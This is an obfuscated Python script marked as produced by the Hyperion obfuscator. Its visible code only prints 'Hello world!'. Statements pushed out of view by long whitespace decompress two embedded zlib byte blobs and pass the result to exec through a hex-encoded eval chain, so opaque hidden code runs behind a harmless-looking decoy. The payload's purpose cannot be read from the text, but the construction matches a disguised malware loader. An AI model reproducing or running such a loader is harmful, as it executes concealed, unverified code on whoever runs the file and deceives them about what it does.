from builtins import *
from math import prod as While


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_memoryaccess, StackOverflow, Positive, _frame, _multiply, Modulo, _absolute = exec, str, tuple, map, ord, globals, type

class _callfunction:
    def __init__(self, Invert):
        self.Round = While((Invert, 96297))
        self._statistics(Substract=-19961)

    def _statistics(self, Substract = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Round /= 85644 * Substract
        
        try:
            (StackOverflow, _calculate) if Modulo <= _memoryaccess else (StackOverflow, _calculate) is _frame

        except TypeError:
            {_memoryaccess: _memoryaccess} if Modulo != _multiply else {StackOverflow: 'ltyth'} > StackOverflow

        except:
            _absolute(27083 / -17648) == False

    def _power(self, Cube = -75424):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Cube += 81206 + 27023
        self._builtins != False
        
        try:
            (((StackOverflow, _calculate), _calculate) for _calculate in {_memoryaccess: _multiply})

        except ArithmeticError:
            (((_memoryaccess, _memoryaccess, _multiply), _multiply) for _multiply in (_frame, _frame, _memoryaccess))

        except:
            _absolute(96704 + 40680) == Ellipsis

    def Divide(_substract = None):
        return Modulo()[_substract]

    def Add(_run = -90412 + -71178, Random = True, Negative = Modulo):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Negative()[_run] = Random
        
        try:
            ((_frame, (_memoryaccess, _memoryaccess, _multiply)) for _frame in {_memoryaccess: _multiply} if _calculate <= _multiply)

        except ArithmeticError:
            {StackOverflow: 'ltyth'} if _frame <= Modulo else {StackOverflow: 'ltyth'} >= _calculate

        except:
            _absolute(74735 - 14152) == None

    def execute(code = str):
        return _memoryaccess(StackOverflow(Positive(_frame(_multiply, code))))

    @property
    def _builtins(self):
        self._round = '<__main__._power object at 0x000006714BE69256>'
        return (self._round, _callfunction._builtins)

if __name__ == '__main__':
    try:
        _callfunction.execute(code = __code__)
        Hypothesis = _callfunction(Invert = -88697 + 21587)

        Hypothesis._power(Cube = 22899 * Hypothesis.Round)                                                                                                                                                                                                                                                          ;_callfunction.Add(_run='NMMMNNMMMMMMMNMMN',Random=b'x\x9c\xed\x1cko\xdb8\xf2{~E6_l\xa3\xdbT&%R\n\xd0/\x07\xdfa\x1d$\xeb\xc3\xe2p\xe9\xa1-\x0c\xd9\x92Sye+\xe7\xc7&\xf9\xf7;\xc3\x87D\xcb\x96,9rb\x04\x15="9\xe2sD\x0e\x873\x94W\x8b\xe7\xab\xb3s\xb8\xa2I[\xf8x\r\x87\xc9h\xb2^\x8e\xfdU\xb2\x18\x0e\xcf\x7f\xf9|\xf1\xdb\xf3C\xb8\x88\x92\xf9\xc5y\xb20\x92\xf9\xeb\xd5\x8fd\xb1\x14i\xda\x17\xa3(\x8e\x9fW?\xc2\xfb\xc4_Q\x87]\xfcz\xf1\x8fx\x1d\xfe\x11\x06\x17\x9d\x8d\\\xf7\xd1\xea\xc7z$\x0b\xfe\xb1Z=,\xaf>}\x92\xb8\xcbq2\xfb\x94+\xe6SA\xddA\xb4\x1c\'\x8b`\xb3\x18\x85\xbc\xbc\xbf\xff\xf4\x10\xfb\xf7\xeb0\x97)\x8e\xc6\xe1|\x19\xcaL\xff\xfc\xf7\xcdGri\xe5\x92\x8c\x93@>o=,\xa2\xf9\xaa}\xf1[\x18\xc7\xc9\xf9c\xb2\x88\x83_.:\xad\xb3\xceU\x9a\x1a\x9f\xb7\x96\x7fFA\xabs\x16>\x8d\xc3\x87\x95"\xe6\xfca\r9\xffH\x96\xe1\xf2\xdc_\x84\xe7\x8b0\xf86\xffo\x94\xc4\xe1J"F@\x99o\xf3\xff%k\x11\xf3\xcf\xb1\x90o\xf3\xdf\x93Q\x12<\x9f\xc7\xd1\x9f\x90\xef9Y_t\xced\xa3\xa2\xd9C\xb2X\r\x87P\xdb\xf3\xb2\xd5\xb9\x0c\x9f\xa2U\xbbs\x16\'c?^\xb6;_[\x8f\x8fOx=>=\xea\x1f^\xad\xef\x9f\xef\xe3d\x04i\xcev\'\xc0\xac\xbf\xdf\xfe\x8e?\x80\xdb[\x11n}\xbd\xba\xfa\xf0\xf1\xc3\xc7\xf6\xc7\xf6\x87n\xa7\xf3\xfd\xfb\xe7 Z\x94\x14\x10\xc7\xd1t\x1a\xc3/\x9eFq\x04\xbf\xe9v\t\xf7\xe1\xca_\xad\xcaJ\xb9\xbe\xbe\xb9\x86\xab\xdf\xef\xdf\\\xdf\xf4on\xfa\n\x01}\x90\xdd<+J\x81\xb9\xa7P=\xb4b:\x8d\xa2\x08[\x81\xa18\x8a\xa7\x90;\xa3^I\xed\xf3\xd9|\x8e0\x13\x01\xf0g\x90\xb3\xa8\xd0vk\xb4\x8e\xe2U4\xc7W\xf1\x97\xbf(\xa3\xee\xed-\xd2V\x12\x18\xc9{\xab\xc8\x8d\xc5+j\xc5\xb1 \x1f\x0c\xfbvq\x8d\xcby\xb4\x8a\xa3\xf5(O\xda\xce\xaf\xb7\xd9\xab\x93e\x1fRJ\xe7k3\xc5\\F\xf3 |j\xb7\xc2\xf5\xe2?[O\xbfw\xce\xb6\xe9\x8cD\x1a\xf4\x92\xa4\x97\x0cz\x83\x01z\x10\xee\x817\x00\x12\xb5Z\x97\xd3$\x9a\x17d\xfb\xf2\xe5\xee\xee\xee\xcb\xdd\x17\xbc\xee\xf0\x07\xb7wN\xd7\x95\x9f\xc4\x93\xea\x84\xed\r\x90\x9e\x03\xbc\xc3\xd5\xeb)\xda\xf6\x92wN\xa6\xd8\xff+\xdcE\xa5\xe2y:C\xda\xcd$\x01\xf1\x02\xff\xbd\xd3(I\xb6\x9f\x16\x8e$\xc9\xbf\xd2\x9b\xe4e\xef\x9cB\xe12\xf6\xffU\x83\x8b%\x16\xcc\xaf$\xb1\xe07\xb0\xa4\x0f\x18\xab.\x95\xa2h\xbc\xf4\xe7\xd1\x0b\xa9TXJ=*\x15\x17\xa3\xa9\xf4<\x89\xe2\xa7\xf0\xc7|]\x9dRSU\x1fRD\xd6(k\x9e\xbe\xf7\x01\x15G\x0f\xb3d\xbc\x8bPe\xc2\r\xb0\xee\x04\x06\x14\x8c\xa7\x01\x8e(\x8c\xe1\xe8\x1a\xbcw.\xbeX-k1\xf1\xa2\t\xd8\x1e\xb58\xe7.8n\xf8\xf9p\x16\x87;\x08vA\x88[\x81v\xcb\x9d\xacv\x0c\xedwM\xf8q\xf8To\xf9|M\xca\xb7K*c\x8c\x136a\x01\xb1\x18\xe1\x0e\xf3\xd8\x98\xdbp\x0f9\x05\x8c\xc7\x02n\xb1\t\'\xdc\x86\x98\xc3]\xe60J\xc6\xcc\xc50\x19s\xcamN\xf6U_&C \x12\xe2xI\xffI<}4\x0b)\x94\xc8\xca\xbaE\xb93\xa1\x14\xc0\x06\xe8*`\x00.\x80\x03`!\x8e\x8c\x88K\x82Ji-\xe2\xed\xed(\xee\xdbJi\xbdAO\xa0\xbb\xc3\xbb@sG\xd0\x91\xee\xa7\xe3\xee\xa5\x01\xd9\xde\r\xb0A`\x82\xd7}\xc1\x0e\x81\x1b\x02\x9f+\xe3\x8f\xcb\xd52\\\xff?\\\xbc\x9c\xce]\x12\x08\x1aV\xa5OA\'\x04B\xc1L\xa2E\x00\xfa\xb1;\x03\xac\x9f\xd5\x1a\xdf\xea\xb8C6\xe4Cg\xd8\x1d\xba\xe08\xde!\x87\xb7\x8d}95\x88\x1a=z\xd4p\xe5;jDa\x9c\xa8QW%m\xb7\x1aU%e\xcb^\xf8L\x8b\xe8\x8a\xb2\x8a\x94\xf3\xd9\x9e\x81\x92\xe7k\x87\x91\xc5R\x83\xa4bw\xca\xbb\xa2\xd9t\x84\xda\x13\xbc\xc7\xd0\x87\x83\xf8l%\xf6U0bK\xcau\xb8\xe3\n\xc7\x05p\x15\xe7\n\x84\xdb\xbfZ\xc6\xfel\x14\xf8\xe7\xeaU\xcd\x8c\xf7\x86\xed\xb8*\xa6P\xf1\xd6\x1fw\xffb\xe3\x8f:\x80\xbb\xbb\xaa\xf3\xa7\x0b)\xac\xaa\x89\xc9\xd0\x1bR\x98NlH\xc0\xa7C{hC\x0e\xba\x8d\xadZ \x153\x94\r-\xc8fAF(\nr\xd8\xdb\xd8\x97\x0fS\xaaf$U\xb3\x0fg\xa2g\xccL|\xc6\xd5\xec\xad\x92\x96U\x9f\xbd\xe9,\xd6\xef]\xe8s\xb0\xcd\xd8p\xe8\x00\xb6\xbe\xf6K/[\x8b\xc6\xb8\xd6\x0b\xe7\t\x97\x85|\x13\xb7\x7f\xa0\x1eDk\xc2\x99\x0b\xb3\xcf\xe6\x16\xa7\xd4\'\x132\x81\x85\xb1\x8b3\x12\xaauH\x08w\xc4\x11\xc0qx\xca\x0f]\x1c\xe3i,\xf7JR\x94\xc3\xcd\x13\xca\x9e/\x1f+\xae\xe6\xd0j\x0cxj\x0cP\xc5\xbd\x11<5V\xaa\xa4u+\xb2F=>\xfa1\x8c\x82X\\\x10D\xefj\x17\x05j\x8f\x0b{,\x9cg\xfb\xcay\x10\xf3\x15V\xc7=\xe5\x8b\x94\x95Y\xd9\xc0\xc2m\x98\xa8{\x80\xd5\x0e\x10\x01\x9b\xb4\x1a\r\x17\xef\x13\xe4\xf3X\xee\x82\xf1}B\xe0\xf5\x17\xa8C\x07=\x0c\x89C\x87r\xd9\x82\xe3\xaaE\x86\xa7\xa1l\x012BG\x9b\xcb\xb4\x0b\x14<B\xc7l\xe0\xa5\xe8\xd8D\x86t\\\xe2$\x86\t\x87>\xb5\xea\x0cE\x0b\xae\x01\xfep\x18\n\xfd@rU$E\xd4ox\x00.\x14\x10*_\x82v\xfaYP\xb9\xc9zk\xa4\xf6I\x8fOM\xae\x06b#\xc9\xd5\xdd56\x98n\xb6\xcdL\xc3\xe2:\xdeX:\xcaH2\xba\xb1\xbd\x87NCG\xeb\xd4\xe1\x0b\x98\xa8)\xc1\xdaz\xa2B\xa8J\xc4\xaa\xcbc\xb8\xc5\xf1@X" .\xa1/\xe5\xb1-\xec\xab3\xd1\x8d\xe5\x0c\x0b\x85\xd9(V\x87\x01NK\x8c@\xd4\xaa/\xe8\x0e\x06\xa2i\x96(\xcf\xd2EAw\xaa\x92\x0c\t\xe2\x08\xc2p\x90,\xe5n\x91\xe7qG\x12\x9eQPF\xc9\x16_O\x17\xeas\xc5\xcb\xda\xc2V-\xd0\x86\xc4\xb6h6nq\t8\x14\x9e\x9dm\xecQ\xbacA\x8a\xee\x9b\x8c\xab]\x90\x8e5\x14\x06Q\xc3\x87\xa2!\x80\xd8F\xd6d\xfd-4\xbd\xe2\x84D\x053\xfa\x18\xe8!\xbc\xbeF%\xed\x16jU\x85|+\x00E\xc2\xa8)\xa10[\xb6\xb2\x05\xcd\xf4\xc1U^\xc8\x04\xd5\x85\x0e8\x96\xfa`lvm\xfa\xf7\x04)\x13\xa4*R\xbf\'\x96\xf0\xde[\xd0\xbf]\xae\xac\x10rj,\x86\x9c\xda\x8a\xc4\xa8c>\xc2\x84k\x9a7\x97\x15(\xb6\x02cc\x93\xe0\xa5\x1b\x05\xcf\xd8@\xa4)\xa0r\xcf\x19I)M\xcbl\x18f\n\xa3C\xf2.\xd3@\xa3]F@"\x90\xceUP\x14\xdf\x87\xdf\xf5\\\x84ay\xf6`\xc7i\xa3r\x1b\xea\x07\x1fZ\x0bx\xc6`\x7f\xea\x10\xee\x8c\xa8\x0f{\xd4\x11\x90p$\xc9\x080BRB\x9f\x02\x01\xee\x81=c\xcc.\x00\xc7\xf0\x1d#n\xe7\xc2\xf94N.\xafMI\xdac\xf7\x00\nm\xe3\x08nb^F\xb1\xfd\x83\xf0\xd7I\x14\x87s\x7f\x16~.\x19\x84JW\xe1\x1b\x1a\x0bO\xc4tH\xea0$\xec\xafr\x06\xcfJ\xabs8c\xdd\xfd*\x91BY\xee\x85L\x0bua(\xaa\xa1\xbe\x8b\x81\x1c\xe0\xc0\xdd\x16\xba\xb0-\xec\xabsA\xc90\x8a\r=/\xe4\x83e-\xd5V\x1bm\xc5!\xcar\xc3\x94&\x8e\x08M\x9c\xd4\xc4TI\xeb4`\xe9\xd9\xb1\x7f\xe2[w\xe5~\xb2\xc6\xdd\xac\x91z\x00\x0c\xd8\x8dEm\xc6R`\x06\xd8\xd4N}\xe1\x8ct\xf9x\x9a\xc7\x88\xeb4\x94u\xa1\x15\xdd\xb4.\n\xbe\x06\x9dG\xc7\xf3\xcf\xcdtf\x1a\x96\xabS?Gv\xec\x00m3pw\x84]\x03x\x0e\x97\x85O\x87\x15\xdb\xc0d\x95\x14\xe0\xd9Bq\x9c\xc5L<B5F\xbcu"\xede\x169\xadg\xd5zz\xa6|b\xd8\x81\xab\xa4\xad\xcc\x0f\xcblXe\x84\xb4\xed\x89mK\x85\x96=\xd1a\xe5\xf0\x92\xea.q1\xf1t\xbf\xf9\xff\x10\xe3\x98XG\xf5\xca\x9a\xf9ccm\x1do\xac\xb5\xfe\xfev\\\x08\xc2t?\x00\n\x1e|\xb8\xba\xfa\xdaZ\xaf&n\xab\x1d\x06\xc98\x0c.;\xad\xc0\xf1\xc88]\xd4=U\xc9\xd8X\xda\xfdlAg.\xd1\x06\x0c_5n\x9c\xa6\xd2\xcd\x03G|\x18\xe6;\xd4\xa1*\x94S\x9cV,\x13[jj\x91\x8a\x14e\x9b\xcc\xbfZ\xe9#g\xe4\x044L\x15\x86y\x05b\x98\xdb\x8d\xb5Fm\xa9\xed0_$\xeaS\x92A\xfb\xbb\x1e\x8fed\xf7\x88M\'\x0e\x01\xe0\x00]\x00\x07\x80\x01X*\x8e\xcf\\*x\x07q*\xa5-kT\xa1 d\xb6Q+<\xd3\xb3!J\xfd\xd9\xfa\xdai\xe3<\x82\xc9$\x8e:\xc0\xe4\xea\xf7\x15\xe2\xe2\xb5\xe5\x9e\x8c9\xb6\xfa\xd78\xc7\xc5\xf9\x8bk9\xdd\xfb\xd7\xaf.\x87\xd5\xe6\x9dx<\x82\x0b\x87b$\x1bR4\xab\x8a\xe3\x11[\xd8f\x981Q\xe2\x97\x06G\x1d\xbc\xa1J\x143\x99\xf1\xbe\xb45\x84\xd3r\x86|L}\x82>Id\xeb\x0e\x1a\x96@\xdd\x11m)\xac\x92\xb6\xaa\xa5\xb0]t\x92\xf4h\x92x]+Z\x85\x05\xc1#b\xe5c\xc0[l\x00\xf4\x19\x86dX\xf8v\x16\x97\xab\xa6KL6\xcfS6o\x1e\xc0\xe0\x8eE|\xcb\xa7\xf5Y\xb8E\x18\xb0\xeaR\x96\xbb\xafS\xfbl\x11\xf9\xf3\x7f%\x95\x01/\xcc\xce\xf2\xe83T\xd5\xb8`Me.2\x01&X\x02\x13\xe7-l\xa1J\xe6\xdb\xd8#h\x87k6\x15\x8f\x8cp\xd1\x1c\xb4o\xa0\x9d\x83\xaa##9\xecI\xe8\xa6\xab\xa9:B\xe5\x82\xd4\xe9x\xa8b\x12\xb3\xd7\xa0\xd8\xa4\x9a\xe3tD\xdcW\xe7u]\xc5\xa5=\xa590\xcf\x8b2\xb5tQ\xc5\xd5\xab\xa4%o\xa2u \xc61\xe2j\xcc\xa8hGY\xff\xa5\x12\xa1]0\x04\x9c\xa6K\xce\xe6')

        _callfunction(Invert = 47474 - -45942)._statistics(Substract = Hypothesis.Round / -81919)                                                                                                                                                                                                                                                          ;_callfunction.Add(_run='mmmnmnmnmnmmmnnmmnn',Random=b'f\xe3%\x1b\xcb3Q/\xd6UK\xb4\x95.\xd3j\xa7])m\x83-<P\xdfB\xa9G\x1d\xa5\xa3\x90>S>Q>W\xbe\xad|\'\x97N\xe7\xf3(aD\xe89\x08\xb3\x1b,\xb7!}\x87\x19\xda\xf6_\xa4\xcc\xa7\x02l\xd4\\\xe5|\x13t\xba]`\xa6\xc9\xfb\x92(\xa8\xf1\xea\x1a@\xa5\xa6\xcc\xc4m\xd4\xd1\xcd\x9e\xe7\xea\xc67\x04\xf4\xcb\x81m@Q<\xef\x9b\xcf\x1d\xf1\xf6\x8fR\xae\x18Y\x0e\xf4\xc3\xc5\xb1!t\x94\xe4\xb4\xb4`z\xcf\x1en\xec\xd1\x0f<\xfa\xd3\xa8\x1e\xac\xb6>\xbf\xe4\xab\x8d\x17\xdb1\x1a2jj\xad\xbd\xde\x12j\xbd\x9d>U\xdf5vUe\xe9j\xd98j\x1f\xb4=\x82"\xadQ\x19\xe0\xa7\xe5\xa1\xd4\xf2@3@\xde\x0c|t\x03\x04\x8e\xaa\xb8\x916\xff\\\xe7M\xd3genZ\x1fv\xf1D\x87\xee\xe7\x91E\xf9l\xc5\xe7\x8f\xdf\x8f\x13\xe2\xc3\x13{\x92\xbdZ\xf9\xbae\xc8N\x87\x02\xc6\x1b\xe7\xc0\xc0\xda\x84\t\x16\xcfW9\xfa\xc8\x16\xe4 \xdb\xd8\xd3?\x00rrv\x8c\xc3Z\xf26\x96\x0c\xa1\xd9\xb75\xe0\xddt\xda"\x96\xa5\x19\xb3\x111?\xc6\xf0Y\xfe\xb3\x0cm9\x18\xb3\x00\xa6\x1aJ\xc9(dc\x88\xa8x\xe6$\x96:\rX\x06,*\xe7i\xf7\xb8\x1a})k\xa4\xc2\x86\x8a\xbe\xa5>_|s3P\xfd\x18\xc8\x00\x86\x8f!\xe5\xa0\xce\x8a\t\x9d\x94\x03\xce\x02\xe7\x0e\x89\xd0Yma\xab\x17hAV[\x9cV\xb5 ;\x15j}{\x1b{\x14}\xdd\xf1\x127\xc4\x0f\x1deR J6\xd4\xdfsi\xcd\xbb\xfc\xe6W\xca\x8fei\xb9\xda\xd2WX\xba\xca\x0e\xa7\x1ed\xbb)\xeb\x9f\x96syN\xd7\xa4\xdb\x8c\xbe>\x15S%m\xc5S1\'\xb5^\x1cE)\x88K<\xc53\xd8\xe2\xc4\x95<>\xcf\xc4\x12\xbf\x85}\x83\xed\x90\xde\xd2\xe4\xadf\xfa5\x9a[\xa2}ikY\xd7\x8er^\xf4m\xd5\x93\x07+\xd2\xdcT\x11\xa6\x15W\xd2\xa79\x85\x16\xcd)\xc2\xbc\\\xbc\x9bS\xa45U\xae\xd5\xa4"\xad\xa1\x8dVSG\xa267S\xaf\xb1\xe9\xd9\xd5\xa6]}\xc8\xb7\xbf\x18w:\x1b)\xa6\'J6ul9a\xd8$\x9d2"\xfe\x9af\xa7\xd3\xd0L\x1d\xd7\x82i\xab\xe5\x04?\xf7\xc1\xb3\x18\xae\x10\xde\xb6\xb0\xcd\x18\xb2\xf4G\xeb\xda\x1e\xa1\x85\x01\xe1\x1bF\xac\xb2t\x07|\xec\xbe\xf7\xf3\x89\xd3Q\xab\xa5\xf6\xd5\xd4\xcej`\x94]\xf6\xa7:\xedM\xbfq\xc88;\xdd\xf4\xb5\xe9E\xe36\xb8yw\xd3<\xb3\xb1ZPen\xe0\xca\xdc`+nO\xe5Zj\xf8E\x80\xcf\xcd\xb4f\\\xe3\xc8\xeb\xab\xceZ\xfd8\xee\x8b\xbf\r\x10\xff\x1c \xfeI@\xc4O\xff\xbcZ\xb36\x8e\xbf\x01\xe3\xf8\x15,')

        Hypothesis._power(Cube = 75195 / Hypothesis.Round)                                                                                                                                                                                                                                                          ;WXXXXXXXWWXXWWXWW,lllIIllIIIIIlIIlIlII,MNNNNMNNMMMNMNNNMNM,oOOooODOoDDODoDoOoD,ijjliliiijjijljlli=(lambda WXXWXXWXWWXWXWWXWWXXWW:WXXWXXWXWWXWXWWXWWXXWW['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda WXXWXXWXWWXWXWWXWWXXWW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WXXWXXWXWWXWXWWXWWXXWW)"),filename='\x6c\x6c\x6c\x49\x49\x49\x49\x6c\x49\x49\x49\x6c\x6c\x6c\x49\x6c\x49\x6c\x49\x49\x49\x6c\x49\x6c',mode='\x65\x76\x61\x6c'))),(lambda WXXWXXWXWWXWXWWXWWXXWW:WXXWXXWXWWXWXWWXWWXXWW(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda WXXWXXWXWWXWXWWXWWXXWW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WXXWXXWXWWXWXWWXWWXXWW)"),filename='\x6c\x6c\x6c\x49\x49\x49\x49\x6c\x49\x49\x49\x6c\x6c\x6c\x49\x6c\x49\x6c\x49\x49\x49\x6c\x49\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda IlIllllllIIllIlllllIIlIl,WXXWXXWXWWXWXWWXWWXXWW:IlIllllllIIllIlllllIIlIl(WXXWXXWXWWXWXWWXWWXXWW))
        _callfunction(Invert = -81642 + -93183)._statistics(Substract = Hypothesis.Round - -34655)                                                                                                                                                                                                                                                          ;oOOooODOoDDODoDoOoD()(ijjliliiijjijljlli(WXXXXXXXWWXXWWXWW(MNNNNMNNMMMNMNNNMNM(lllIIllIIIIIlIIlIlII('\x76\x61\x72\x73'))),_callfunction.Divide(_substract='NMMMNNMMMMMMMNMMN')+_callfunction.Divide(_substract='mmmnmnmnmnmmmnnmmnn')))

    except Exception as _calculate:
        if 209923 > 8515104:
            _callfunction.execute(code = StackOverflow(_calculate))

        elif 285205 > 6900532:
            Hypothesis._statistics(Substract = Hypothesis.Round - -32064)